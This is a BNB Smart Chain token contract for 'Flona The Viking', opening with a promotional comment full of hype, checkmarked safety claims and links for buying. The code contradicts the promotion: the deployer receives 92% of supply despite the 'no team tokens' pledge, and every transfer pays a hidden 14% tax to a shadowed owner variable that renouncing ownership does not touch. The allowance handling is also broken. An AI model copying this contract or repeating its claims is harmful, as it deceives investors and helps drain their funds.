/**
 *Submitted for verification at BscScan.com on 2023-01-24
*/

/**
🆕🥇 💥 Flona The Viking  💥🥇🆕

No team tokens. No presale. 100% Community!
FlonaTheViking
Flona is the girl of Floki’s dreams. The apple of his eye, he was instantly captured by her beauty and similarity to him. 💞

Community driven.⚔️
https://flona.io/#roadmap
https://medium.com/@FlonaTheViking
📞 https://t.me/FlonaTheViking 📞
https://twitter.com/FlonaTheViking

ROADMAP
PHASE 1
* Launch Social Media Channels
* Launch Token Website
* Develop Smart Contract on ETH
* Stealth Launch on Uniswap
* Building Community
* Liquidity locked for 1 year.
* Expanding Team

PHASE 2
* Launch Marketing Strategy
* Connecting with Influencers
* CoinMarketCap Listing
* CoinGecko Listing
* Letter to Floki on Valentine’s Day

PHASE 3
* Extending liquidity lock
* DAO Integration
* Whitepaper Release
* Audit + KYC
…
PHASE 4
Stay tuned
PHASE 5
Stay tuned
💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞💞
WOOF! I’M YOUR’S…
Let’s build on these feelings we have.

Everyone needs that special someone in their life. Their person. 
Their other half that completes their journey and fulfills that spark in their life. In the crypto space, there is no difference. 
Love and luck will always find their way. Look at Shiba and Shina, they are perfect for each other. They both reached great heights and massive gains. 
With Floki’s all time high reaching 3.7B, very soon my friends, cupid will aim his arrow upwards again. 

Make way! There is a new duo of dog lovers coming to the scene…

This time it’s not just puppy love.

   
✨💯🔥 0x95d17D96D8743455327f15B82EA770E9dE2231B4 🔥💯✨

SAFU  ✅
AUDIT ✅
KYC.    ✅
DOXX  ✅
💥Lock 1 Years
💥Renounce
✨ LP LOCK 
✨ Ownership Renounced
✨Community Token
✨Organic Grow


🔶 We're excited to bring this innovative digital asset to our community. 
With its fast and low-cost transactions, it's the perfect addition to your portfolio.🔶 

If you have any questions or need help 🆘 getting set up, please don't hesitate to contact our support team📞. They're here to help you every step of the way. 

Don't miss out on this opportunity 🥇and get your hands on the new BSC token today!⏳"

💥"The future is here, and it's our Flona The Viking Token. 🔥
🔥 Get in on the ground floor and watch it soar."💥


⚡️Let's trust it 💯💯💯
⚡️Let's shill it.💪 💪💪
⚡️Let's spread it.💯💯💯
⚡️Let's share it.🚀🚀🚀
⚡️Let's support it.💪💔💪
⚡️Let's invest in it.💰💰💰
⚡️Let’s moon it 🌘🌑🌑🌑
By this we can do more than expected guys lets all good luck🔥🔥🔥🔥

📄Contract Address :
0x95d17D96D8743455327f15B82EA770E9dE2231B4 

SWAP  👍
https://pancakeswap.finance/swap?outputCurrency=0x95d17D96D8743455327f15B82EA770E9dE2231B4
dextools 👍
https://www.dextools.io/app/en/bnb/pair-explorer/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
PooCOIN 👍
https://poocoin.app/tokens/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
Worldcoinstats  👍
https://worldcoinstats.com/?q=0x95d17D96D8743455327f15B82EA770E9dE2231B4 
Dexview 👍
https://www.dexview.com/bsc/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
bogged 👍
https://charts.bogged.finance/?c=bsc&t=0x95d17D96D8743455327f15B82EA770E9dE2231B4 
geckoterminal 👍
https://www.geckoterminal.com/bsc/pools/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
dexscreener 👍
https://dexscreener.com/bsc/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
bscscan 👍
https://bscscan.com/token/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
honeypot 👍
https://honeypot.is/?address=0x95d17D96D8743455327f15B82EA770E9dE2231B4 
staysafu 👍
https://app.staysafu.org/scan/free?a=0x95d17D96D8743455327f15B82EA770E9dE2231B4 
bitquery 👍
https://explorer.bitquery.io/bsc/token/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
keepshare 👍
https://keepshare.xyz/ContractDetection/56/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
gopluslabs 👍
https://gopluslabs.io/token-security/56/0x95d17D96D8743455327f15B82EA770E9dE2231B4 
tokensniffer 👍
https://tokensniffer.com/token/bsc/0x95d17D96D8743455327f15B82EA770E9dE2231B4

*/

// SPDX-License-Identifier: licensed
pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address ) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/26181
        return msg.data;
    }
}

interface FLONADeployer {
  // @dev Returns the amount of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `value` tokens are moved from one account (`from`) to  another (`to`). Note that `value` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 value);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `value` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
contract FLONATHEVIKING is FLONADeployer, Context, Ownable {
  
    // common addresses
    address private _owner;
    address private FLONATeam;
    address private CharityFLONA;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Flona The Viking";
    string public override symbol = "FLONA";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint value);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint value);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(uint totalSupplyValue, address FLONATeamAddress, address CharityFLONAAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        _owner = msg.sender;
        FLONATeam = FLONATeamAddress;
        CharityFLONA = CharityFLONAAddress;
        
        // split the tokens according to agreed upon percentages
        balances[FLONATeam] =  totalSupply * 4 / 100;
        balances[CharityFLONA] = totalSupply * 4 / 100;
        
        balances[_owner] = totalSupply * 92 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return _owner;
    }
    
    // Get the address of the token's FLONATeam pot
    function getDeveloper() public view returns(address) {
        return FLONATeam;
    }
    
    // Get the address of the token's founder pot
    function getFounder() public view returns(address) {
        return CharityFLONA;
    }
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint value) public override returns(bool) {
        require(value > 0, "Transfer value has to be higher than 0.");
        require(balanceOf(msg.sender) >= value, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total value
        uint taxTBD = value * 14 / 100;
        uint burnTBD = value * 0 / 100;
        uint valueAfterTaxAndBurn = value - taxTBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += valueAfterTaxAndBurn;
        balances[msg.sender] -= value;
        
        emit Transfer(msg.sender, to, value);
        
        // finally, we burn and tax the extras percentage
        balances[_owner] += taxTBD + burnTBD;
        _burn(_owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint value) public override returns(bool) {
        allowances[msg.sender][spender] = value; 
        
        emit Approval(msg.sender, spender, value);
        
        return true;
    }
    
    // allowance
    function allowance(address owner , address spender) public view  returns(uint) {
       return allowances[owner][spender];
 }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint value) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= value, "Allowance too low for transfer.");
        require(balances[from] >= value, "Balance is too low to make transfer.");
        
        balances[to] += value;
        balances[from] -= value;
        
        emit Transfer(from, to, value);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}